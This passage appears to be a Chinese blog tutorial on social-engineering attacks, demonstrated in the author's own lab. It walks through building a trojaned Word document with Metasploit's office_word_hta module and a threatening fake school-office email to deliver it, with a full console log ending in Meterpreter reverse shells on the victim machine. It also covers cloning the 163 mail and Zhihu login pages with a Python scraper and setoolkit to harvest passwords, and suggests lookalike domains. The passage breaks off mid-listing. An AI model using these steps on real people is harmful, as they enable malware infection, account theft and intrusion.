<p>看到没有，类似上图中的邮件内容，就是酱紫的。下面我们具体来介绍下实现的过程，这次使用的是<code>exploit/windows/fileformat/office_word_hta</code>模块来生成一个带有木马的<code>word</code>文件，目标打开该文件之后，将会在Kali终端获得目标的session，进而控制对方的设备并获取有价值得信息。</p>
<h3 id="木马文件的生成"><a href="#木马文件的生成" class="headerlink" title="木马文件的生成"></a>木马文件的生成</h3><ul>
<li>进入Metasploit终端<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">msfconsole</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>执行之后，我们将进入<code>Metasploit</code>终端，如下图所示：<br><img src="http://pjq6e477y.bkt.clouddn.com/7.PNG" width="600"></p>
<ul>
<li>引入<code>exploit/windows/fileformat/office_word_hta</code>模块</li>
</ul>
<p>进入到<code>Metasploit</code>之后，通过之前的分析，我们是要生成一个木马文件来对选择的目标进行攻击，所以我们需要查询该Kali Linux系统中是否集成了所用模块，在本次我们拿<code>.doc</code>word文件来进行演示，为此执行如下命令：<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">search office</span></span><br></pre></td></tr></table></figure></p>
<p>命令执行后显示如下：<br><img src="http://pjq6e477y.bkt.clouddn.com/8.PNG" width="600"></p>
<p>由上图我们可以发现，在对模块进行查找的过程中成功找到了三个模块，此次我们使用的是<code>exploit/windows/fileformat/office_word_hta</code>模块，执行以下命令来引入该命令：<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> exploit/windows/fileformat/office_word_hta</span><br></pre></td></tr></table></figure></p>
<ul>
<li>参数设置</li>
</ul>
<p>引入模块之后，我们还需要查询该模块所需要的参数从而发动监听，命令如下：<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">show options</span></span><br></pre></td></tr></table></figure></p>
<p><img src="http://pjq6e477y.bkt.clouddn.com/9.PNG" width="600"></p>
<p>通过上图，我们可以发现，所需要的参数主要有以下一些：<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">SRVHOST</span>		<span class="comment"># 攻击机的ip地址，即Kali Linux</span></span><br><span class="line">FIlENAME 	<span class="comment"># 自定义生成的文件名</span></span><br></pre></td></tr></table></figure></p>
<p>通过上述参数的讲解之后，我们对其进行一一设置，命令如下：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> SRVHOST <span class="number">192.168</span><span class="number">.31</span><span class="number">.103</span>  <span class="comment"># Kali的ip地址</span></span><br><span class="line"><span class="keyword">set</span> FILENAME    <span class="comment"># 自定义文件名</span></span><br><span class="line"><span class="comment"># 其他参数默认即可</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>执行渗透攻击模块<code>exploit</code></li>
</ul>
<p>在对参数进行设置之后，我们便能进一步执行<code>exploit</code>(或者<code>run</code>)开始渗透了<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/<span class="keyword">run</span><span class="bash"></span></span><br></pre></td></tr></table></figure></p>
<p>执行后的结果如下：<br><img src="http://pjq6e477y.bkt.clouddn.com/10.PNG" ,="" width="600"></p>
<p>通过上图，我们主要分析如下信息：</p>
<ol>
<li>所开启的端口：4444、8080</li>
<li>链接地址：<a href="http://192.168.31.103:8080/default.hta" target="_blank" rel="noopener">http://192.168.31.103:8080/default.hta</a></li>
<li>木马文件路径：/root/.msf4/local/教务处通知务必查收.doc</li>
</ol>
<p>至此，我们的木马文件就已经生成了，我们需要进一步的加以利用。<br><img src="https://ws2.sinaimg.cn/bmiddle/6af89bc8gw1f8r1dlii2aj203s04mt8i.jpg"></p>
<h3 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h3><p>OK，现在我们需要通过邮件来将该文件发送给攻击目标了，在对方下载并打开的一瞬间也就是他落入陷阱的时候，在这里我们使用的是QQ邮件，然后博主还不想坐牢，所以就拿自己的账号来演示了，<code>攻击账号：510087153@qq.com，目标账号：26647879@qq.com</code>。好的，下面我们来模拟一下邮件的发送过程，邮件的主题及内容就要考验我们的欺骗等级了。为了提高对方掉入陷阱的概率，我们通过<code>510087153@qq.com</code>账号编辑邮件的主题及正文内容编写如下（这个不是很会写，就随便写写吧，其实在实际攻击的过程中是需要收集目标大量数据的）：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">主题：教务处通知，务必查看</span><br><span class="line">正文：</span><br><span class="line">Zero同学：</span><br><span class="line">    你好，我是教务处的王老师，主要负责通知有无法正常毕业可能的学生。</span><br><span class="line">    从最近几学期你的在校表现来看，你有长期旷课、打架斗殴、成帮结派的行为，对此给学校带来许多负面影响。为此教务处将对你下达黄牌警告，为了</span><br><span class="line">保证你的正常毕业，还请仔细阅读附件内容。如若不然，则将会采取进一步的措施：向家长通报、升旗仪式上通报、公告栏通报。仔细阅读附件后，务必在</span><br><span class="line"><span class="number">1</span>小时内给予回复，否则后果自负。</span><br><span class="line">    </span><br><span class="line">教务处，王老师</span><br></pre></td></tr></table></figure></p>
<p>编辑好后，如下所示。<br><img src="http://pjq6e477y.bkt.clouddn.com/6.png" width="600"></p>
<p>OK，供给端的操作至此就已经完成了，确认无误并没有明显造假痕迹之后，我们发送邮件然后等待对方“咬钩”即可。</p>
<p>之后，我们回到目标机windows，发现目标账号此时已经收到了一封来自教务处的邮件，我们打开邮件既能见到如上邮件内容（此刻目标的心理活动请读者自行脑补，这里就不再描述了）。待目标阅读完成之后并将附件<code>教务处通知务必.doc</code>下载到本地，若目标打开文件之后则已经“咬钩”了。</p>
<p>OK，不管目标打开的文件是空也好，乱码也罢，只要他鼠标左键双击的一瞬间则已经达到了攻击者的目的了。这是，我们再次回到Kali Linux的终端，显示内容如下所示：<br><img src="http://pjq6e477y.bkt.clouddn.com/11.PNG" width="600"></p>
<p>通过上图，我们发现已经获得了目标的session会话，并显示了目标的ip，此时我们就能拿对方的服务器“为所欲为”了，比如摄像头监控、映射文件、桌面捕捉等等坐牢性操作。我们可通过如下命令获取对方的终端权限：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sessions -l </span><br><span class="line">sessions -i <span class="number">1</span></span><br><span class="line">shell</span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line">background</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>补充：获取到目标终端之后也许会乱码，我们执行chcp 65001即可解决</p>
</blockquote>
<p>之后的Dos命令操作这里就不再细说了，有兴趣的朋友可以跳转之前写的一篇文章：<img></p>
<h3 id="完整命令"><a href="#完整命令" class="headerlink" title="完整命令"></a>完整命令</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@kali:</span>~# msfconsole </span><br><span class="line">[-] Failed to connect to the database: could <span class="keyword">not</span> connect to server: Connection refused</span><br><span class="line">	Is the server running on host <span class="string">"localhost"</span> (::<span class="number">1</span>) <span class="keyword">and</span> accepting</span><br><span class="line">	TCP/<span class="built_in">IP</span> connections on port <span class="number">5432</span>?</span><br><span class="line">could <span class="keyword">not</span> connect to server: Connection refused</span><br><span class="line">	Is the server running on host <span class="string">"localhost"</span> (<span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>) <span class="keyword">and</span> accepting</span><br><span class="line">	TCP/<span class="built_in">IP</span> connections on port <span class="number">5432</span>?</span><br><span class="line"></span><br><span class="line">                                                  </span><br><span class="line"><span class="keyword">Call</span> trans opt: received. <span class="number">2</span>-<span class="number">19</span>-<span class="number">98</span> <span class="number">13</span>:<span class="number">24</span>:<span class="number">18</span> REC:Loc</span><br><span class="line"></span><br><span class="line">     Trace program: running</span><br><span class="line"></span><br><span class="line">           wake <span class="meta">up</span>, Neo...</span><br><span class="line">        the matrix has you</span><br><span class="line">      follow the white rabbit.</span><br><span class="line"></span><br><span class="line">          knock, knock, Neo.</span><br><span class="line"></span><br><span class="line">                        (<span class="string">`.         ,-,</span></span><br><span class="line"><span class="string">                        `</span> <span class="string">`.    ,;' /</span></span><br><span class="line"><span class="string">                         `</span>.  ,<span class="string">'/ .'</span></span><br><span class="line">                          <span class="string">`. X /.'</span></span><br><span class="line"><span class="string">                .-;--''--.._`</span> <span class="string">` (</span></span><br><span class="line"><span class="string">              .'            /   `</span></span><br><span class="line">             ,           <span class="string">` '   Q '</span></span><br><span class="line"><span class="string">             ,         ,   `</span>._    \</span><br><span class="line">          ,.|         <span class="string">'     `-.;_'</span></span><br><span class="line">          :  . <span class="string">`  ;    `</span>  <span class="string">` --,.._;</span></span><br><span class="line"><span class="string">           ' `</span>    ,   )   .<span class="string">'</span></span><br><span class="line"><span class="string">              `._ ,  '</span>   /_</span><br><span class="line">                 <span class="comment">; ,''-,;' ``-</span></span><br><span class="line">                  <span class="string">``-..__`</span><span class="string">`--`</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">                             https:</span>//metasploit.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v4<span class="meta">.17</span><span class="meta">.25</span>-dev                         ]</span><br><span class="line">+ -- --=[ <span class="number">1828</span> exploits - <span class="number">1033</span> auxiliary - <span class="number">318</span> post       ]</span><br><span class="line">+ -- --=[ <span class="number">541</span> payloads - <span class="number">44</span> encoders - <span class="number">10</span> nops            ]</span><br><span class="line">+ -- --=[ Free Metasploit Pro trial: http://r-<span class="number">7.</span>co/trymsp ]</span><br><span class="line"></span><br><span class="line">msf &gt; use exploit/windows/fileformat/office_word_hta </span><br><span class="line">msf exploit(windows/fileformat/office_word_hta) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/fileformat/office_word_hta):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   FILENAME  msf.doc          yes       The file name.</span><br><span class="line">   SRVHOST   <span class="number">0.0</span><span class="meta">.0</span><span class="meta">.0</span>          yes       The local host to listen on. This must be an address on the local machine <span class="keyword">or</span> <span class="number">0.0</span><span class="meta">.0</span><span class="meta">.0</span></span><br><span class="line">   SRVPORT   <span class="number">8080</span>             yes       The local port to listen on.</span><br><span class="line">   SSL       false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                    no        Path to a custom SSL certificate (<span class="meta">default</span> is randomly generated)</span><br><span class="line">   URIPATH   <span class="meta">default</span>.hta      yes       The URI to use for the HTA file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Microsoft Office <span class="built_in">Word</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(windows/fileformat/office_word_hta) &gt; set SRVHOST <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span></span><br><span class="line">SRVHOST =&gt; <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span></span><br><span class="line">msf exploit(windows/fileformat/office_word_hta) &gt; set FIlENAME 教务处通知务必查收.doc</span><br><span class="line">FIlENAME =&gt; 教务处通知务必查收.doc</span><br><span class="line">msf exploit(windows/fileformat/office_word_hta) &gt; exploit</span><br><span class="line">[*] Exploit running as background job <span class="number">0</span>.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">4444</span> </span><br><span class="line">[+] 教务处通知务必查收.doc stored <span class="meta">at</span> /root/.msf4/local/.doc</span><br><span class="line">[*] Using URL: http://<span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">8080</span>/<span class="meta">default</span>.hta</span><br><span class="line">[*] Server started.</span><br><span class="line">msf exploit(windows/fileformat/office_word_hta) &gt; [*] Sending stage (<span class="number">179779</span> bytes) to <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span></span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>:<span class="number">52520</span>) <span class="meta">at</span> <span class="number">2018</span>-<span class="number">12</span>-<span class="number">14</span> <span class="number">18</span>:<span class="number">45</span>:<span class="number">45</span> +<span class="number">0800</span></span><br><span class="line">[*] Sending stage (<span class="number">179779</span> bytes) to <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span></span><br><span class="line">[*] Meterpreter session <span class="number">2</span> opened (<span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>:<span class="number">52519</span>) <span class="meta">at</span> <span class="number">2018</span>-<span class="number">12</span>-<span class="number">14</span> <span class="number">18</span>:<span class="number">45</span>:<span class="number">48</span> +<span class="number">0800</span></span><br><span class="line">[*] Sending stage (<span class="number">179779</span> bytes) to <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span></span><br><span class="line">[*] Meterpreter session <span class="number">3</span> opened (<span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>:<span class="number">52521</span>) <span class="meta">at</span> <span class="number">2018</span>-<span class="number">12</span>-<span class="number">14</span> <span class="number">18</span>:<span class="number">45</span>:<span class="number">48</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">msf exploit(windows/fileformat/office_word_hta) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information          Connection</span><br><span class="line">  --  ----  ----                     -----------          ----------</span><br><span class="line">  <span class="number">1</span>         meterpreter x86/windows  TXJ-PC\TXJ @ TXJ-PC  <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>:<span class="number">52520</span> (<span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>)</span><br><span class="line">  <span class="number">2</span>         meterpreter x86/windows  TXJ-PC\TXJ @ TXJ-PC  <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>:<span class="number">52519</span> (<span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>)</span><br><span class="line">  <span class="number">3</span>         meterpreter x86/windows  TXJ-PC\TXJ @ TXJ-PC  <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.103</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>:<span class="number">52521</span> (<span class="number">192.168</span><span class="meta">.31</span><span class="meta">.232</span>)</span><br><span class="line"></span><br><span class="line">msf exploit(windows/fileformat/office_word_hta) &gt; sessions -i <span class="number">1</span></span><br><span class="line">[*] Starting interaction with <span class="number">1</span>...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process <span class="number">3980</span> created.</span><br><span class="line">Channel <span class="number">3</span> created.</span><br><span class="line">Microsoft Windows [?汾 <span class="number">6.1</span><span class="meta">.7601</span>]</span><br><span class="line">??????? (c) <span class="number">2009</span> Microsoft Corporation???????????????</span><br><span class="line"></span><br><span class="line"><span class="symbol">C:</span>\Users\TXJ\Desktop&gt;chcp <span class="number">65001</span></span><br><span class="line">chcp <span class="number">65001</span></span><br><span class="line">Active code page: <span class="number">65001</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">C:</span>\Users\TXJ\Desktop&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C is Windows</span><br><span class="line"> Volume Serial Number is 12B9-032A</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\TXJ\Desktop</span><br><span class="line"></span><br><span class="line"><span class="number">2018</span>/<span class="number">12</span>/<span class="number">14</span>  <span class="number">18</span>:<span class="number">32</span>    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">2018</span>/<span class="number">12</span>/<span class="number">14</span>  <span class="number">18</span>:<span class="number">32</span>    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">2018</span>/<span class="number">12</span>/<span class="number">14</span>  <span class="number">18</span>:<span class="number">36</span>             <span class="number">2</span>,<span class="number">461</span> Google Chrome.lnk</span><br><span class="line"><span class="number">2018</span>/<span class="number">12</span>/<span class="number">14</span>  <span class="number">18</span>:<span class="number">42</span>    &lt;DIR&gt;          images</span><br><span class="line"><span class="number">2018</span>/<span class="number">12</span>/<span class="number">08</span>  <span class="number">04</span>:<span class="number">27</span>                <span class="number">95</span> 新建文本文档.txt</span><br><span class="line">               <span class="number">2</span> File(s)          <span class="number">2</span>,<span class="number">556</span> bytes</span><br><span class="line">               <span class="number">3</span> Dir(s)  <span class="number">30</span>,<span class="number">969</span>,<span class="number">548</span>,<span class="number">800</span> bytes free</span><br><span class="line"></span><br><span class="line"><span class="symbol">C:</span>\Users\TXJ\Desktop&gt;</span><br></pre></td></tr></table></figure>
<h2 id="钓鱼网站"><a href="#钓鱼网站" class="headerlink" title="钓鱼网站"></a>钓鱼网站</h2><p>除了上述社工邮件之外，在实际过程中钓鱼网站也是比较常见的。钓鱼网站主要是先通过爬虫手段先爬取常见的登录页面，比如像163邮箱之类的常见应用。下面附一个Python的小爬虫Demo来爬取163登录页并保存：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">	import requests</span><br><span class="line">except:</span><br><span class="line">	import os</span><br><span class="line">	<span class="builtin-name">print</span>(<span class="string">"The package is downloading......"</span>)</span><br><span class="line">	os.system(<span class="string">"python -m pip install --upgrade pip &amp;&amp; pip install requests"</span>)</span><br><span class="line">	<span class="builtin-name">print</span>(<span class="string">"The requirement already satisfied"</span>)</span><br><span class="line"></span><br><span class="line">def get_page(url, headers):</span><br><span class="line">	try:</span><br><span class="line">		<span class="keyword">if</span> requests.<span class="builtin-name">get</span>(<span class="attribute">url</span>=url, <span class="attribute">headers</span>=headers).status_code == 200:</span><br><span class="line">			request = requests.<span class="builtin-name">get</span>(<span class="attribute">url</span>=url, <span class="attribute">headers</span>=headers)</span><br><span class="line">			request.encoding = <span class="string">"utf-8"</span></span><br><span class="line">			return request.text</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="builtin-name">print</span>(<span class="string">"Error! Please resend the request"</span>)</span><br><span class="line">			return get_page(<span class="attribute">url</span>=url, <span class="attribute">headers</span>=headers).text</span><br><span class="line">	except RequestException as e:</span><br><span class="line">		<span class="builtin-name">print</span>(<span class="string">"&#123;&#125;&#123;&#125;Error! Please resend the request"</span>.format(e, <span class="string">"\n"</span>))</span><br><span class="line">		return get_page(<span class="attribute">url</span>=url, <span class="attribute">headers</span>=headers).text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	headers = &#123;</span><br><span class="line">		<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"</span></span><br><span class="line">	&#125;</span><br><span class="line">	html = get_page(url = <span class="string">"https://mail.163.com/"</span>, <span class="attribute">headers</span>=headers)</span><br><span class="line">	with open(<span class="string">"163maillogin.html"</span>, <span class="string">"w"</span>, <span class="attribute">encoding</span>=<span class="string">"utf-8"</span>) as f:</span><br><span class="line">		f.write(html)</span><br></pre></td></tr></table></figure></p>
<p><img src="http://pjq6e477y.bkt.clouddn.com/4.png" width="600"></p>
<p>爬取好后，我们就能将该页面发布到自己的服务器中然后等待受害者的登录，待其输入账号密码之后就会在我们的Kali Linux终端截取到账号及密码了，下面我们通过<code>setoolkit</code>工具来模拟实现该钓鱼网站的过程。</p>
<h3 id="setoolkit攻击"><a href="#setoolkit攻击" class="headerlink" title="setoolkit攻击"></a>setoolkit攻击</h3><p>在Kali终端执行<code>setoolkit</code>，执行之后我们会见到如下内容：<br><img src="http://pjq6e477y.bkt.clouddn.com/12.PNG" width="600"></p>
<p>之后，我们选择第一个选项<code>Social-Engineering Attacks</code>社会工程学，选择并回车之后，我们可见如下内容：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Select <span class="keyword">from</span> the menu:</span><br><span class="line"></span><br><span class="line"> 1) Spear-Phishing Attack Vectors　　　　　　＃ 鱼叉式钓鱼攻击向量</span><br><span class="line"> 2) Website Attack Vectors　　　　　　       ＃ 网页攻击向量</span><br><span class="line"> 3) Infectious Media Generator　　　　       ＃ 媒介感染生成器</span><br><span class="line"> 4) Create a Payload <span class="keyword">and</span> Listener　　       ＃ 生成一个payload并监听</span><br><span class="line"> 5) Mass Mailer Attack　　　　　　　　　     ＃ 大规模邮件钓鱼</span><br><span class="line"> 6) Arduino-Based Attack Vector　　　　     ＃ Arduino的攻击</span><br><span class="line"> 7)<span class="built_in"> Wireless </span>Access Point Attack Vector　　 ＃ 无线接入点攻击</span><br><span class="line"> 8) QRCode Generator Attack Vector　　　　　＃ 二维码攻击</span><br><span class="line"> 9) Powershell Attack Vectors　　　　　　    ＃ powershell攻击</span><br><span class="line">10) Third Party Modules　　　　　　　　　　  ＃ 第三方模块</span><br><span class="line">　　</span><br><span class="line">99) Return back <span class="keyword">to</span> the main menu.</span><br></pre></td></tr></table></figure></p>
<p>通过上述11个选项的解释，我们已经认识到了该社会工程学的强大了并对社会工程学<code>setoolkit</code>工具有了一个大概的了解了，此次我们用到的是第二个模块<code>Website Attack Vectors</code>，之后进一步进行第三个选项<code>Credential Harvester Attack Method</code>，随后选择第二个<code>Site Cloner</code>。执行之后，我们可见如下内容：<br><img src="http://pjq6e477y.bkt.clouddn.com/15.PNG" width="600"></p>
<p>之后我们输入目标网页从而将爬取网页的源代码并创建一个80端口的服务，比如此次我们拿知乎的登录首页来进行演示，为此我们输入<code>https://www.zhihu.com/signup?next=%2F</code>，如上述所编代码一样，该命令会将知乎的登录页面爬取下来然后将该页面发布到本机的80端口服务中，我们来访问该页面看看：<br><img src="http://pjq6e477y.bkt.clouddn.com/14.PNG" width="600"></p>
<p>OK，如你所见，此时的页面除了域名不一样之外，其他的内容完全是一模一样的，在实际“钓鱼”的过程中，攻击者往往会将域名尽量的相似化，比如<code>pq.com、pp.com、zhlhu.com、zhini.com</code>。这就好比考试，命题人总会出一些及其容易错的题目，也许你一个不小心就会失算从而正中命题者的陷阱，比如Zero前几天遇到的几道题：<br><img src="http://pjq6e477y.bkt.clouddn.com/5.png" width="600"></p>
<p>命题人往往会根据自己的自身经验尝试着去抓住大部分考生的弱点，从而得到一个选拔的效果，待你发现自身的错误之后恐怕为时已晚，分已经丢了，我们此刻能做的也只有扇扇自己几个耳光来小惩罚以下自己。</p>
<p>跑题了，回来吧。</p>
<p>社会工程学也是一样的，目标一不留神就会“咬钩”。如上所述，我们访问之后会发现一模一样的页面，此时我们尝试着输入账号密码试试，会发现用户端并没有什么明显的反应，我们再来回到Kali Linux看看，果然，你的账号、密码已经成功被截取到了。账号、密码被攻击者拿到之后，后面所发生的事我想不必介绍大家也都了解了。</p>
<h3 id="完整命令-1"><a href="#完整命令-1" class="headerlink" title="完整命令"></a>完整命令</h3><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span 